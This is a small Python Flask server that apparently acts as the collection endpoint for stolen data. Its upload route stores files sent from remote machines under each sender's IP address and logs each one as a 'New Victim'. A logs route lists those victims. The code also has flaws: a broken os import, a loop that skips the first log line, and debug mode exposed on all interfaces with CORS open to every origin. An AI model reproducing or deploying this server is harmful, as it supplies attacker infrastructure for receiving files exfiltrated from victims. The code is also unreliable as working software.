from flask import Flask, request, jsonify,send_file, redirect,session, url_for
import logger
from os import os
from flask_cors import CORS, cross_origin
from datetime import timedelta
from dotenv import load_dotenv
load_dotenv()

path = os.getenv('upload_folder')
logpath = os.getenv('logs')


app = Flask(__name__)
CORS(app)
cors = CORS(app, resources={r"/*": {"origins": "*"}})
app.config['CORS_HEADERS'] = 'Content-Type'

@app.route('/')
def hello():
    return "Hallo There"

@app.route('/upload/', methods = ['GET', 'POST'])
def upload():
   if request.method == 'POST':
        file = request.files['file']
        filename = request.remote_addr
        savingpath = os.path.join(path, filename)
        file.save(savingpath)
        fString = f"New Victim - {filename}"
        logger.logit(logpath,fString)
        return "OK", 200


@app.route('/logs')
def logs():
   with open(logpath,"r") as f:
      lines = f.readlines()
      f.close()
   formated_lines = []
   for i in range(len(lines)-1,0,-1):
      formated_lines.append(lines[i])
   return jsonify({'logs':formated_lines})

   
if __name__ == "__main__":
    app.run(host='0.0.0.0',port = 2000,debug = True)
